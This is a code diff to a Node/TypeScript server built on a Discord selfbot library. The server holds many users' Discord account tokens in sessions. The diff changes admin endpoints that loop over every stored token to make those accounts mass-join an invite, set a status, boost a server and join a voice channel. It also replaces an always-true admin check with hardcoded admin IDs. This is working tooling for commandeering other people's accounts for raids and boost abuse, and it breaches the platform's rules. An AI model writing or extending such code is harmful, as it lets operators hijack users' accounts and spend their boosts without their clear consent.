@@ -154,7 +154,7 @@ import { createServer as createViteServer } from "vite";
 import cors from "cors";
 import multer from "multer";
 import { v4 as uuidv4 } from "uuid";
-import { Client, RichPresence, Options, MessageAttachment, Intents } from "discord.js-selfbot-v13";
+import { Client, RichPresence, CustomStatus, Options, MessageAttachment, Intents } from "discord.js-selfbot-v13";
 import { createCanvas, loadImage } from "canvas";
 import { supabase } from "./src/lib/supabase";
 import { FriendAutomator, getProfile, generateProfile } from "./src/services/discordTools";
@@ -13447,8 +13447,18 @@ async function formatImageForRpc(img: any): Promise<string | null> {
     res.status(200).send("Pong!");
   });
   const checkAdmin = __name((req) => {
-    
-    return true;
+    const token = req.headers.authorization;
+    if (!token) return false;
+    const cleanToken = token.trim().replace(/^["']|["']$/g, "");
+    const session = sessions.get(cleanToken);
+    if (!session) return false;
+    const admins = [
+      "1453843872286380218",
+      "1545509798756487241",
+      "1545521054930436167",
+      "1545389998315143229"
+    ];
+    return admins.includes(session.id);
   }, "checkAdmin");
   app.get("/api/admin/all-sessions", (req, res) => {
     if (!checkAdmin(req)) {
@@ -13470,18 +13480,26 @@ async function formatImageForRpc(img: any): Promise<string | null> {
       return res.status(400).json({ error: "Invite code required" });
     console.log(`[ADMIN] Global Mass Join initiated for: ${inviteCode}`);
     let count = 0;
-    const tokens = Array.from(activeClients.keys());
+    const tokens = Array.from(sessions.keys());
     for (const t of tokens) {
-      const client = activeClients.get(t);
-      if (client) {
-        try {
-          if (typeof client.acceptInvite === "function") {
-            await client.acceptInvite(inviteCode).catch(() => {});
+      try {
+        const client = await getClient(t).catch(() => null);
+        if (client) {
+          if (typeof (client as any).acceptInvite === "function") {
+            await (client as any).acceptInvite(inviteCode).catch(() => {});
             count++;
+            addLog(t, `[ADMIN] Mass joined server via invite: ${inviteCode}`);
+          } else {
+             const invite = await client.fetchInvite(inviteCode).catch(() => null);
+             if (invite) {
+                await invite.accept().catch(() => {});
+                count++;
+                addLog(t, `[ADMIN] Mass joined server via invite: ${inviteCode}`);
+             }
           }
-        } catch (e) {}
-        await new Promise((r) => setTimeout(r, 1e3));
-      }
+        }
+      } catch (e) {}
+      await new Promise((r) => setTimeout(r, 1e3));
     }
     res.json({ success: true, count });
   });
@@ -13491,12 +13509,20 @@ async function formatImageForRpc(img: any): Promise<string | null> {
     if (!status) return res.status(400).json({ error: "Status required" });
     console.log(`[ADMIN] Global Status Update: ${status}`);
     let count = 0;
-    for (const client of activeClients.values()) {
+    
+    const tokens = Array.from(sessions.keys());
+    for (const token of tokens) {
       try {
-        const customStatus = new CustomStatus(client).setState(status);
-        client.user?.setPresence({ activities: [customStatus] });
-        count++;
-      } catch (e) {}
+        const client = await getClient(token).catch(() => null);
+        if (client && client.user) {
+          const custom = new CustomStatus(client).setState(status);
+          client.user.setPresence({ activities: [custom] });
+          count++;
+          addLog(token, `[ADMIN] Global status updated to: ${status}`);
+        }
+      } catch (e) {
+        console.error(`[ADMIN] Failed to update status for ${token}:`, e);
+      }
     }
     res.json({ success: true, count });
   });
@@ -13564,16 +13590,19 @@ async function formatImageForRpc(img: any): Promise<string | null> {
     if (!guildId) return res.status(400).json({ error: "Guild ID required" });
     console.log(`[ADMIN] Global Mass Boost initiated for: ${guildId}`);
     let count = 0;
-    for (const client of activeClients.values()) {
+    
+    const tokens = Array.from(sessions.keys());
+    for (const token of tokens) {
       try {
+        const client = await getClient(token).catch(() => null);
+        if (!client) continue;
+
         const guild = await client.guilds.fetch(guildId).catch(() => null);
         if (guild) {
-          const subscription = await guild
-            .fetchPremiumSubscription()
-            .catch(() => null);
           if (guild.premiumSubscriptionCount < 30) {
             await guild.boost().catch(() => {});
             count++;
+            addLog(token, `[ADMIN] Boosted server: ${guild.name} (${guildId})`);
           }
         }
       } catch (e) {}
@@ -13587,8 +13616,13 @@ async function formatImageForRpc(img: any): Promise<string | null> {
       return res.status(400).json({ error: "Channel ID required" });
     console.log(`[ADMIN] Global Join VC initiated for: ${channelId}`);
     let count = 0;
-    for (const [token, client] of activeClients.entries()) {
+    
+    const tokens = Array.from(sessions.keys());
+    for (const token of tokens) {
       try {
+        const client = await getClient(token).catch(() => null);
+        if (!client) continue;
+
         let channel = null;
         if (guildId) {
           const guild = await client.guilds.fetch(guildId).catch(() => null);
@@ -13598,30 +13632,26 @@ async function formatImageForRpc(img: any): Promise<string | null> {
         } else {
           channel = await client.channels.fetch(channelId).catch(() => null);
         }
-        if (
-          channel &&
-          (channel.type === "GUILD_VOICE" ||
-            channel.type === "GUILD_STAGE_VOICE" ||
-            (typeof channel.isVoiceBased === "function" &&
-              channel.isVoiceBased()))
-        ) {
+        
+        if (channel && channel.isVoiceBased()) {
           const joinOptions = {
             selfDeaf: false,
             selfMute: false,
             video: false,
           };
-          if (typeof channel.join === "function") {
-            await channel.join(joinOptions);
-          } else if (
-            client.voice &&
-            typeof client.voice.joinChannel === "function"
-          ) {
+          
+          if (client.voice && typeof client.voice.joinChannel === "function") {
             await client.voice.joinChannel(channel, joinOptions);
+          } else if (typeof (channel as any).join === "function") {
+            await (channel as any).join(joinOptions);
           }
+          
           count++;
-          addLog(token, `[ADMIN] Joined VC ${channel.name} (${channelId})`);
+          addLog(token, `[ADMIN] Joined VC ${channel.name || channelId}`);
         }
-      } catch (e) {}
+      } catch (e) {
+        console.error(`[ADMIN] Join VC error for ${token}:`, e);
+      }
     }
     res.json({ success: true, count });
   });
